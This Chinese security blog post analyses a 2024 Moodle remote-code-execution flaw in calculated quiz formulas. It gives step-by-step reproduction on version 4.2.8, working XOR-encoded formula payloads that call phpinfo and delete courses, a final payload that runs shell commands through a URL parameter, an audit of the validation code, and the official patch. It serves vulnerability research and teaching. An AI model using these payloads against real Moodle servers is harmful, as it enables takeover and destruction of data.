#  moodleRCE 独特的bypass思路  
原创 ZAC安全  ZAC安全   2026-01-10 04:50  
  
moodleRCE 独特的bypass思路  
  
  
  
ZAC安全  
  
#2025#  
  
////前言  
  
这个洞是24年爆出来的，当时也发了文章，但是当时比较因为敏感文章被删了。现在刚好过了一年多，补个档把过程和细节重新整理一遍。  
  
RCE的利用手法比较有趣，遂简单分析一手  
  
  
原漏洞作者分析：  
  
https://blog.redteam-pentesting.de/2024/moodle-rce/  
  
  
  
  
  
1  
  
  
  
**01**  
  
漏洞复现  
  
官网下载  
moodle4.2.8  
版本  
  
https://git.moodle.org/gw?p=moodle.git;a=snapshot;h=2d41ac46f45d49872db03db14ea3cfda1152c62c;sf=tgz  
  
  
访问主页安装  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hvgWoPo5rNNa4yNHqFSTWJA3huiaNNibgxORglQ7YkvQNTkgNEsNACGIg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hgYTh4QntcIiaxwnWHRia2ydVDTluWoodYucLjpCWe6dU4SQMEUAEoCxg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hjKLeuuriaFM0AS3g84zILiaz4RSV1MVF0FWSgmWiaibATuSfks68BiaCQqg/640?wx_fmt=png&from=appmsg "")  
  
  
  
一路默认即可，看到下面的页面就说明安装成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hu9u7TkpPb6OkD7Z6LXtgZkgSAjNmSCZlVJVCzGMicNEHHzc1PusszzQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
正式开始漏洞复现：  
  
Home->Available courses-> Add a new course  
   
进行添加一个课程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hMeczmwPfRR2iaiavZ9oecut2Y5NBvdRaSBTSniaicQ0gWJnvvl3gzl5yOg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h0nvV4ZQGdlTJNH8LneSRoicYgWw3Ygf6bibm8ko6yFP2KP9IH3Qssgpw/640?wx_fmt=png&from=appmsg "")  
  
  
  
将页面往下拉，找到  
Course format  
  
将  
topics format   
改成  
single activity format  
（在  
moodle  
框架中  
topics format  
相当于是一个主题论坛的课程，而我们复现需要用到测验题，所以需要更改课程类型）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hSO68Vc4XJh7ljBzgTvhyq6WoibqonuNJibkG3Qm6pNZribPKVs2NbdrKA/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后将  
type of activity  
改成  
quiz  
类型  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hwwgcWODQ0xDSib8yQQhb86NLSV8CEkQlNAFZ0vd0jeAMKqM6LAlicgWA/640?wx_fmt=png&from=appmsg "")  
  
  
  
Save  
即可看到课程生成完成  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hibYjkDx2IZxzNWKk4XN3fjIgpdokaLcjib5v1RAxs5UdG9iclqGj9XHSA/640?wx_fmt=png&from=appmsg "")  
  
  
  
点击  
class1  
，写个  
Name  
即可，剩下的按默认格式  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h7kPaLLa3CMjgXKAJuVG7rvX7AibHialh5lhSWmA08uHzpibgZB3213q5A/640?wx_fmt=png&from=appmsg "")  
  
  
  
Class1->Activity->Add question->Add->a new question  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hOFwTv7wiazpad6GMHF1ib0It69vgicka61E1q9vcH1icUP41pF4Xu7rQcw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h6KaibsuKWMtIA2Upu15sNLjBo8dmvt63PlFo2EfGdHGMBQAIjZpyyHw/640?wx_fmt=png&from=appmsg "")  
  
  
我们选择  
Calculated  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hteXhmFJiazxYdHFQxFSdLyBFa7pV0UrHkJhKW2x6ibXuoqib02mVtC7pQ/640?wx_fmt=png&from=appmsg "")  
  
  
然后我们新建一个问题，其中的  
question test  
是我们的问题，这套系统中的  
{}  
是用来括变量的，中间的  
a  
相当于通配符  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hjuVJKJMKTxWaqu4b7xXCKIXw7xUnx4vcb3137KSFWP28ko5tI2LX2Q/640?wx_fmt=png&from=appmsg "")  
  
  
  
答案设置成  
a   
，  
grade  
是百分百 进行保存  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hNIWBn2XIG5z3ibTpyGuhLNPbmc7YHVEugOMAhgsIjaIMPqLPrADiavvQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hLXmIfNjP8jATZMjtInTHMn5X7XVL2raMJkKwUI6yjp9I3Q6e5hNrJg/640?wx_fmt=png&from=appmsg "")  
  
  
  
这三个空写上我们想删除的课程  
id  
，第一次默认创建的课程  
id  
都是  
2  
，后续创建的课程  
id  
依次递增  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hfBS64mEVxfbyXH0eSkdIKcwZ53WcicLDI924uyicKZlWVxyUViczTsEzg/640?wx_fmt=png&from=appmsg "")  
  
  
  
点击  
add  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h7ThHlO9e3Du7E1rY6a5ZjcqkW6zZWWa2L3v3LBgn9h1mBtd9vicp4Aw/640?wx_fmt=png&from=appmsg "")  
  
  
然后就可以  
save  
了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hGXkS8Q2hHp4DerIqJhHTwOZG7ZZDOtF0WQkGRDjict7qCOEuaiaFyayQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
跳转回来，我们在点击  
test1  
，进行二次编辑  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hGT7YZs0pCibeOLNkZ6YU5ibOianicIicepdz8PA9Objoicg2x3Gws4XeM7uA/640?wx_fmt=png&from=appmsg "")  
  
  
  
将答案改成  
  
((acos(2) . 0+acos(2) . 0+acos(2) . 0+acos(2) . 0+acos(2)) ^ (8 . 4 . 2 . 8 . 8 . 3 . 4 . 0 . 0 . 0 . -1 . 3) ^ (2 . 0 . 0 . 3 . 0 . 0 . 0 . 0 . 0 . -8 . 1 . 0) ^ (0 . 0 . 0 . 0 . 0 . 0 . -2 . 1 . 4 . 6 . 0 . 0) ^ (0 . 0 . 0 . 0 . -8 . 8 . 0 . 0 . 2 . 0 . -8)){a}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hdhhOVXxbkDxDUj4vM5MHgy5W9n01ejPvicRIl5fxuEicia0GlocicauFwQ/640?wx_fmt=png&from=appmsg "")  
  
  
然后保存，会发现有个报错，不用管，忽略即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h8pHCgI46cu2VCPsLUsul08kLh6D6VgoZHfUfonmKy03AwxxfoURX7g/640?wx_fmt=png&from=appmsg "")  
  
      
  
回到主页，点击  
class1->preview quiz  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h3H4gyKoJibMcNEF3yM8E0watOnfvrOZGtgiaujQ9hUnbBXCdhib69bcUg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hYGO4PxxDJgIjYkafE2uP9Zz8BwKOPTcZYyf2yc8picVPLloNlBTlLZg/640?wx_fmt=png&from=appmsg "")  
  
  
发现课程已经被删除  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hckZKVmtMCRSB2Jiax1QZMActFPk9oBHSrzCGbfz7XPAicncOrk4TYmNQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hg0CQxnZAPN25WVaKs2miaRXtN7NPnkdOMxb3TlPblXrkt8dEmatSg9w/640?wx_fmt=png&from=appmsg "")  
  
  
  
而执行简单命令  
的方式与上面几乎相同，用作者给的脚本跑一下  
payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hicUYg2JiaR8ukFeKInQya8nQ2KvbeAXSMsGRCuoT7bNa381Fu0iaWeFKw/640?wx_fmt=png&from=appmsg "")  
  
((acos(2) . 0+acos(2) . 0+acos(2)) ^ (2 . 1 . 1 . 0 . 0 . 0 . 0) ^ (1 . 0 . 0 . 0 . 0 . 0 . 0) ^ (0 . 0 . -4 . 8 . 8 . 1) ^ (-8 . 2 . 3 . 7 . 0 . 0)){a}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hlXjUIc1xLbaUbEOSGjOJXqO7QddicDJuOJZG9GbQwAfoibDiaxs5A7Z4g/640?wx_fmt=png&from=appmsg "")  
  
  
该方式  
只能使用  
phpinfo  
，  
DELETE_COURSE  
这种单参数的函数，利用受限  
  
进阶方式如下，  
question text  
中设置为  
{b}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h1ibsNHCAJfOLNZViaf3x7ZTnkuzH07UFW3jPKNGQhgajHoCEUp2sxwhg/640?wx_fmt=png&from=appmsg "")  
  
  
打入  
payload  
  
(1)->{system($_GET[chr(97)])}  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hvd7iaLy6Prm2K5FwZbPESKiaS0PGUIdDNZYrvxIlM6C1RrribfBUutPkw/640?wx_fmt=png&from=appmsg "")  
  
  
保存进行下一步，  
f12  
，将所有  
payload  
变量设置为  
0  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hRfl7a4qT2icxxXM9icADicVIhR8Zjqr13dLMXMJEcQAvibsrKE3nlCYd4w/640?wx_fmt=png&from=appmsg "")  
  
  
点击  
next pages  
，会发现报错  
Exception - system(): Argument [#1]()  
 ($command) cannot be empty  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h7CuDOlkYKEPM8TAtMD6Jvic4WeMwnQLOusj9etxBCTUwNptf4HXIDtw/640?wx_fmt=png&from=appmsg "")  
  
  
我们直接  
url  
打入命令即可成功完成  
RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hCkCcNnUMaA8bzkBespGTTT8xibTcrne4rbGqbQoR8dtSdApF9757gZg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
2  
  
  
  
**01**  
  
代码审计  
  
原作者给的验证脚本是  
substitute_variables_and_eval  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hzs4J06BBFgFV0qSqxZVDq2OOOsx0tNuxZscnMurWDgdopuXdnrfnpw/640?wx_fmt=png&from=appmsg "")  
  
  
在源码中找到该函数进行跟踪分析，我们可以看到字符串过了一个  
substitute_variables  
和  
qtype_calculated_find_formula_errors  
两个部分就直接拼进  
eval  
了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hrz8PtdVSUQQOmkGJ9rgbmYEibDv5HuiawQjFJdxZBebl2RNh7GbbqGzA/640?wx_fmt=png&from=appmsg "")  
  
  
  
而该函数调用的位置也比较明显，在  
calculate  
函数中，而在经过这几个函数过滤后直接放进了  
calculate_raw  
中的  
eval  
函数中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h3DSMCruf7K6icHpO5Ket6CI6deEP30WR7xc1YhgNia0Wfj6fdWUs5U4A/640?wx_fmt=png&from=appmsg "")  
  
  
  
那么我们一起来分析下这些过滤语句都是什么，先进入  
qtype_calculated_find_formula_errors  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9ho0zpvfsdTRf9Q8niblpBCXrEJsa32Y9jC3QeDzKOcTCo8u1Z0qHXvWg/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9htO8nRYavJaia7duOpkrWcCic6VOWjdo5r9VZxYJicFsfFFHfwImsCiaTTQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hK31ibLz44X5H753o0jNVst0OVaBm37Nlib0lred8N5ibrPHsqyTy1Y2HQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
一点点走，首先过滤了注释符号和  
php  
的  
<??>  
  
['//', '/*', '#', '<?', '?>']  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hpicB4KHwj8Q63ghdoLXXB2pBLUpgPAJw3aqt5JS6NXzF62dLojcyyhg/640?wx_fmt=png&from=appmsg "")  
  
  
然后是将所有变量都被替换为数字  
 1.0  
，这里我们可以看上面的  
PLACEHODLER_REGEX  
定义。假设公式是  
 "{a} + {b} * {c}"  
，那么正则表达式会匹配  
 {a}, {b}   
和  
{c}  
，并将它们替换为  
 '1.0'  
，得到的结果是：  
"1.0 + 1.0 * 1.0"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hVq34P3zbhFrm8IIF7o2DFyGUt0QTDdMMTNouwn0w2iaC8RSA9T81Glw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h0jJLByz9h8DAEbCTicS8bvUg6w5yfdFDxsWmWfUrfjh5dljfbDT915g/640?wx_fmt=png&from=appmsg "")  
  
  
这段理解较为简单，将公式中的所有字符转为小写并移除空格，然后 设置允许的操作符，例如加减乘除等常用的数学符号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hW7deUTbpMMFXnoFNPj7CqLDiam6OlTuPgKdHuupkibjhVuGgJmGq6tag/640?wx_fmt=png&from=appmsg "")  
  
  
  
然后进行正则表达式，判断函数格式以及参数，然后方便进行下一步的判断，比如  
pi  
这种无参数函数，如果给他参数就会报错。还有单参数或多参数的函数判断  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h4mewYGzctN2u2MZwC7iaB3AXgicxqmMfrIQZoGHeg2iaFL2t1lB2tzQ1g/640?wx_fmt=png&from=appmsg "")  
  
  
  
通过这些后进行一次正则替换，将函数调用变成  
1.0  
，例如以下示例  
  
"3 + sin(30) * max(10, 20)"  
  
就会被替换成  
  
"3 + 1.0 * 1.0"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hVOicJ6h46icB8hj3Mme6wFqE9t3UNmiafvmJyAutoK9EBpw53UTmn39Ng/640?wx_fmt=png&from=appmsg "")  
  
  
最后再确定是否有非法字符，然后  
return  
，这就是  
qtype_calculated_find_formula_errors  
函数的完整逻辑  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h68icpbGiaSQxy6qvtfWVGnqZmMvNU6npTIYwibOncS0hvPS8TSrFViapxQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
那么如何通过以上这些操作符和数字我们创建出一个函数名呢？  
  
这里我们需要了解一下  
php  
中的三角函数，对于  
acos  
和  
asin  
这种反函数来说未定义的值会输出  
double  
类型的  
NAN  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h0ibDdiakYBVcZd3lglMTHZkoDofYZpafULh7N6cS36qgcQOWtpictHzBA/640?wx_fmt=png&from=appmsg "")  
  
  
而通过  
php  
的点号连接符，我们可以将这两个变量变成一个字符串类型的  
NANNAN  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hVicOZtR2VLZFM9xC4BIyCic1kibotRxXeqsLHiaTxFMXfMlrp2S3ic0kKog/640?wx_fmt=png&from=appmsg "")  
  
  
但是，通过刚刚验证代码的逻辑，我们可以知道在公式调用中是无法单独使用  
acos(2).acos(2)  
的，因为其中没有操作符，两个函数拼不到一起（此时的点号无法作为小数点）  
  
所以稍稍将这段进行一个变种  
  
acos(2) . 0+acos(2)  
  
在意思不变的情况下，此时就可以通过逻辑代码的验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hENv0kZicfpKS4uGZB77RyeOzOuZTtWZoQQ0Wic7pxictlpUvHWE5yNwNA/640?wx_fmt=png&from=appmsg "")  
  
  
  
现在我们拥有了  
NA  
这两个字符，那么如何将这个字符变成我们想要调用的函数呢？  
  
答案是：异或  
  
逻辑很简单，  
ab  
相同为  
0  
，不同为  
1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hhNUP8q30KMAoeiapkdWzXs2hnTAcica6DrrOAsavPLByLhEqHccoVf3w/640?wx_fmt=png&from=appmsg "")  
  
  
好，用一段简单的代码  
  
echo (acos(2) . 1) ^ (0 . 0 . 0) ^ (1 . 1 . 1);  
   
可以生成  
O@O  
，两个字母  
O  
和一个  
@  
符号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hI7vQVWr2L9ebzGfiajp0nAHzIuSdL7ukUw1ic3VRZicl4PqFZJy3hugLQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
众所周知，在计算机中每个字母和符号都会有一个  
ASCII  
码对应，而每一个  
ASCII  
码都可以转化为二进制数字。我们就是通过异或最终的二进制数字去转成任何我们想要的字符串  
  
比如这个案例  
  
N   
：  
ASCII: 78   
二进制：  
01001110  
  
0   
：  
ASCII: 48   
二进制：  
00110000  
  
1   
：  
ASCII: 49   
二进制：  
00110001  
  
先将  
N  
和  
0  
进行异或，然后再与  
1  
进行异或。最终异或结果为  
01001111   
对应为  
ASCII 79  
     
大写字母  
O  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hDQnqHa5sITdvxEpx9hj2HQLia9uP5EicBA7hRvKC3kkxgltbzrpOeX9g/640?wx_fmt=png&from=appmsg "")  
  
  
而这里要引入一个概念，我们知道正数的二进制高位一般是  
0  
，例如  
5  
的二进制是  
00000101  
，但是我们可以利用负数  
补码进行高位的异或  
，例如  
-5  
的二进制数为  
11111011  
，这样通过各种异或，我们可以制造出任何想要的字符串  
  
例如我们测试用的字符串  
phpinfo  
  
echo(((acos(2) . 0+acos(2) . 0+acos(2)) ^ (2 . 1 . 1 . 0 . 0 . 0 . 0) ^ (1 . 0 . 0 . 0 . 0 . 0 . 0) ^ (0 . 0 . -4 . 8 . 8 . 1) ^ (-8 . 2 . 3 . 7 . 0 . 0)))  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hQkxKx1nwhQfSEkFfdVT30F6OBK0jmWY3ggE81r5cZ60kxZYx478jcA/640?wx_fmt=png&from=appmsg "")  
  
  
而这时我们还需要一剂良药，也就是变量函数的特性，比如在  
python  
当中我们可以使用如下代码打印  
1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hjk0ibXBqcXdiaMMZvjzHAOaFp2qVaOkQ2ukIToy6FCBFgyveibY8ib4Vmg/640?wx_fmt=png&from=appmsg "")  
  
  
但无法直接将  
’PRINTF’  
这串字符作为一个函数来进行调用。而  
PHP  
刚好可以，以下两种用法结果完全一样  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hW8iaot5fHhJzuWibvh8jn4GpicIIicA2DcsuazxPqDHYQ10hrZvYYNaKyg/640?wx_fmt=png&from=appmsg "")  
  
  
  
好了，以上前置知识了解完，我们继续回头分析  
   
  
qtype_calculated_find_formula_errors  
  
目前我们可以通过反三角函数以及编码的特性来制作出一个我们想要的字符串，但是光一个字符串  
phpinfo  
是无法进行函数调用的，我们至少还需要一个括号  
phpinfo()  
进行执行  
  
此时我们的解析的字符在  
433 return  
回来，紧接着进入到  
436  
行中的  
substitute_values_for_eval   
进行解析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h1UibWw3NffECL7GPQOOEhwkcBqmkibeu7Fnl5XBJkwgyPTATZ4V8kamw/640?wx_fmt=png&from=appmsg "")  
  
  
  
我们跟进这个函数，发现将  
$expression   
中的所有  
 $this->search   
值替换为  
 $this->safevalue  
  
根据注释和代码我们可知  
  
当变量  
 a   
被设置为  
 1   
时，  
{a}   
将被替换为  
 (1)  
。因此，如果我们在上面的表达式中添加  
 {a}  
，对应于  
 'PRINTF'  
，结果将变为  
 'PRINTF'(1)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hCJLiagiadKvAOQ73r2Pp5zNEOoYIjhS2rEKqbO0VP27WXMOlyV17ibuYA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hzqbJB5ia912IW9GmKhtyMpg4DYcqiaxzCsYnbkrwQMlBgQ109FwO3wmg/640?wx_fmt=png&from=appmsg "")  
  
  
而最终逃出单参数限制的  
RCE  
也是利用了  
php  
的特性  
  
https://www.php.net/manual/en/language.variables.variable.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hdlx5wJeIticzyvh1fSX0icPy9Mibeibw1Ne7X0j1p3T281fzVE50rATMNg/640?wx_fmt=png&from=appmsg "")  
  
  
而通过这种方式我们可以将危险函数作为变量传入  
(  
在  
moodle  
中花括号里包裹变量  
)  
  
(1)->{system($_GET[chr(97)])}  
  
我们可以拿作者原脚本进行  
debug  
查看  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hNcPFiciaXWuJYpunk2MWfJZ0qJ9a0q23zRlEhxxJHicb2icxLHt0hN1k6Q/640?wx_fmt=png&from=appmsg "")  
  
  
  
将  
formula  
传入验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hsUel6NcOsJpIF7erq5BWpRDG0VLKJbVLZD5tx1oAkMvrcqFt4x8W9w/640?wx_fmt=png&from=appmsg "")  
  
  
  
由于  
 ->   
并不是限制的非法字符，它在该验证函数中并不会被识别为问题。这里正则匹配的规则是  
 {[  
字母开头的合法占位符名称  
]}  
，并没有限定开头后的其他字符除了  
 >, }  
，所以顺利通过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h3mLmRUGianZLrf3IvH6NUQCsY4nvsur6dQ6icTF9RrA8wXc1lBq22VZw/640?wx_fmt=png&from=appmsg "")  
  
  
  
可以看到，因为没有匹配到指定数学函数直接进行了  
break  
，然后通过验证  
return false  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hRNSzYoT6Y2VAHkryicGLicYJibonKs1BZmj8hibxXTIfIua8xeY9AjNwqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hIiakpiboGwqgAvhDUk1oxsOtLr3tibpQJ6Vgkia8cfrIPe55LaIIibhs8Wg/640?wx_fmt=png&from=appmsg "")  
  
  
最后直接进入  
eval  
进行调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9h79FjibibR1wtlHTgibXib4eCFCdKo7ROouelyajicIkicZp76FmJN6mrmN7A/640?wx_fmt=png&from=appmsg "")  
  
  
  
最终官方的修复也比较简单  
  
https://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=622ee0920925e719d3e0f1215d90b813afd00ca5  
  
将正则加了限制，只允许字母，数字，连字符，下划线和空格。箭头括号等特殊符号不在被允许。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G4mSF69ia2lA2FicLHh2JLWHe3904lFt9hjCyk6F5LFGx7HIGmlqDI2fKuKAibkpEGpYooW6zL17ttqtJk5K6Wrqg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
**宣传页**  
  
**ZAC安全**  
  
本人微信：zacaq999  
   
  
文章内容如有任何错误或者对不上号的，可以加我微信，感谢各位大佬们的指点  
  
安全宝典欢迎各位大佬**以投稿方式免费进入！**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G4mSF69ia2lAAuMdiciciaElOABhgic5DkIIh4P6lFq5iadazHQRsicIeFTDW9osG0Pf47uA6Iq9jeSSLDnmCpbs7mPAA/640?wx_fmt=jpeg "")  
  
  
  
  
  
  
